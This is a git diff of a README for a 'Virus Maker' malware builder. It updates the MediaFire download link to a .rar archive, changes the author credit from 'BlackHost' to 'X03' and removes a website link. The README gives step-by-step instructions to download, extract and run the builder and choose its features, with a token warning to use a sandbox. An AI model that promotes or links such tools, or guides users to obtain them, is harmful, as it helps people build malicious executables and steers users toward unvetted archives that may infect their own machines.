@@ -18,7 +18,7 @@ Virus Maker is a tool designed to generate custom executable files with various 
 - **File Generation**: Create executable files with the selected functionalities.
 
 ## How to Use
-1. **Download Virus Builder**: [Click here to download](https://www.mediafire.com/file/bpkukrxuiwp0z0k/builder.rar/file)
+1. **Download Virus Builder**: [Click here to download](https://www.mediafire.com/file/5m3hja457or8b4p/builder-v1.1.rar/file)
 2. **Extract the Files**: Use WinRAR or any archive tool to extract the builder.
 3. **Run the Software**: Open Virus Maker.
 4. **Select Features**: Check the boxes for the desired functionalities.
@@ -31,8 +31,6 @@ Virus Maker is a tool designed to generate custom executable files with various 
 - Running the generated files on a personal or unauthorized system can lead to irreversible changes.
 - Always use a virtual machine or sandboxed environment for testing.
 
-## Credits
-Developed by **BlackHost**
+Developed by **X03**
 
-For further information, visit the official website: [www.blackhost.xyz](http://www.blackhost.xyz)
 
